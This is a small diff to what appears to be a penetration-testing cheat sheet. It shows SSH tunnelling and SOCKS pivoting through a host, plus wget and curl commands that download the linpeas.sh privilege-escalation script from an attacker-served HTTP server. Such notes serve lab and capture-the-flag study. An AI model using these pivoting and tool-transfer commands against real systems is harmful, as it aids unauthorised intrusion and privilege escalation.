@@ -32,7 +32,8 @@ ssh -tt -L8080:localhost:8157 solcoteh@10.10.10.10 ssh -t -D 8157 solcoteh@10.10
 ## linux ✅
 ```bash
 python3 -m http.server 8000
-wget http://0.0.0.0:8000/linpeas.sh
+wget http://10.10.10.10:8000/linpeas.sh
+curl -O http://10.10.10.10:8000/linpeas.sh
 ```
 ## windows ✅
 ```bash
